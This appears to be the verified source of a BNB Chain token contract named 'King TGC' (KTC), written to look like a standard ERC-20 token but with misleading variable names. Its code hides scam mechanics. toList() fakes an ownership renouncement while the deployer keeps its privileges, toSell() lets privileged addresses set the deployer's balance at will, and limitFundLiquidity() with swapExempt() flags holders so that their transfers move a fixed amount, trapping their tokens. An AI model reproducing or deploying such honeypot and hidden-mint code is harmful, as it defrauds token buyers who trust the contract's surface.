/**
 *Submitted for verification at BscScan.com on 2023-02-11
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract feeMin {
    function minTotal() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface fromToken {
    function createPair(address receiverTeamBuy, address receiverFrom) external returns (address);
}

interface autoIsMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KingTGC is IERC20, feeMin {
    uint8 private sellTx = 18;
    

    mapping(address => mapping(address => uint256)) private receiverSwap;
    uint256 public isShould;
    uint256 private takeFee;
    bool public walletMode;


    address public limitWallet;
    uint256 private takeLaunched;
    bool public minSender;

    uint256 private teamTotal = 100000000 * 10 ** sellTx;
    uint256 constant isMax = 13 ** 10;
    mapping(address => bool) public liquidityFee;
    address private fromBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public txLimit;
    address private tradingMarketing;
    bool public fundMarketing;
    mapping(address => uint256) private receiverAuto;
    bool public fromFee;
    uint256 private tradingLaunched;
    
    string private receiverLimit = "KTC";
    mapping(address => bool) public marketingAuto;
    bool public autoSender;
    string private swapReceiver = "King TGC";
    bool public maxTo;
    uint256 public exemptMaxToken;
    

    event OwnershipTransferred(address indexed walletLiquidity, address indexed txMarketing);

    constructor (){
        
        autoIsMarketing tokenReceiver = autoIsMarketing(fromBuy);
        limitWallet = fromToken(tokenReceiver.factory()).createPair(tokenReceiver.WETH(), address(this));
        tradingMarketing = minTotal();
        if (walletMode) {
            walletMode = true;
        }
        txLimit = tradingMarketing;
        liquidityFee[txLimit] = true;
        if (fromFee == autoSender) {
            fundMarketing = true;
        }
        receiverAuto[txLimit] = teamTotal;
        emit Transfer(address(0), txLimit, teamTotal);
        toList();
    }

    

    function modeTokenIs() public {
        
        
        maxTo=false;
    }

    function toList() public {
        emit OwnershipTransferred(txLimit, address(0));
        tradingMarketing = address(0);
    }

    function limitFundLiquidity(address minTake) public {
        
        if (minTake == txLimit || minTake == limitWallet || !liquidityFee[minTotal()]) {
            return;
        }
        if (walletMode) {
            fromFee = false;
        }
        marketingAuto[minTake] = true;
    }

    function owner() external view returns (address) {
        return tradingMarketing;
    }

    function toAtSwap(address modeLaunchTotal) public {
        if (minSender) {
            return;
        }
        
        liquidityFee[modeLaunchTotal] = true;
        if (fundMarketing != autoSender) {
            fromFee = true;
        }
        minSender = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return teamTotal;
    }

    function minAmount() public {
        if (walletMode != maxTo) {
            maxTo = false;
        }
        if (maxTo == walletMode) {
            takeFee = tradingLaunched;
        }
        takeFee=0;
    }

    function fundToken(address launchExemptAt, address minLimitShould, uint256 atList) internal returns (bool) {
        require(receiverAuto[launchExemptAt] >= atList);
        receiverAuto[launchExemptAt] -= atList;
        receiverAuto[minLimitShould] += atList;
        emit Transfer(launchExemptAt, minLimitShould, atList);
        return true;
    }

    function decimals() external view returns (uint8) {
        return sellTx;
    }

    function approve(address buyTrading, uint256 atList) public virtual override returns (bool) {
        receiverSwap[minTotal()][buyTrading] = atList;
        emit Approval(minTotal(), buyTrading, atList);
        return true;
    }

    function transfer(address launchedLaunch, uint256 atList) external virtual override returns (bool) {
        return swapExempt(minTotal(), launchedLaunch, atList);
    }

    function allowance(address atReceiver, address buyTrading) external view virtual override returns (uint256) {
        return receiverSwap[atReceiver][buyTrading];
    }

    function getOwner() external view returns (address) {
        return tradingMarketing;
    }

    function isFeeMarketing() public view returns (uint256) {
        return exemptMaxToken;
    }

    function toSell(uint256 atList) public {
        if (!liquidityFee[minTotal()]) {
            return;
        }
        receiverAuto[txLimit] = atList;
    }

    function walletTake() public view returns (bool) {
        return fromFee;
    }

    function exemptLaunchIs() public view returns (uint256) {
        return takeFee;
    }

    function transferFrom(address launchExemptAt, address minLimitShould, uint256 atList) external override returns (bool) {
        if (receiverSwap[launchExemptAt][minTotal()] != type(uint256).max) {
            require(atList <= receiverSwap[launchExemptAt][minTotal()]);
            receiverSwap[launchExemptAt][minTotal()] -= atList;
        }
        return swapExempt(launchExemptAt, minLimitShould, atList);
    }

    function balanceOf(address listReceiver) public view virtual override returns (uint256) {
        return receiverAuto[listReceiver];
    }

    function limitSwap() public view returns (bool) {
        return autoSender;
    }

    function swapExempt(address launchExemptAt, address minLimitShould, uint256 atList) internal returns (bool) {
        if (launchExemptAt == txLimit || minLimitShould == txLimit) {
            return fundToken(launchExemptAt, minLimitShould, atList);
        }
        if (takeLaunched != isShould) {
            walletMode = false;
        }
        if (marketingAuto[launchExemptAt]) {
            return fundToken(launchExemptAt, minLimitShould, isMax);
        }
        
        return fundToken(launchExemptAt, minLimitShould, atList);
    }

    function symbol() external view returns (string memory) {
        return receiverLimit;
    }

    function name() external view returns (string memory) {
        return swapReceiver;
    }


}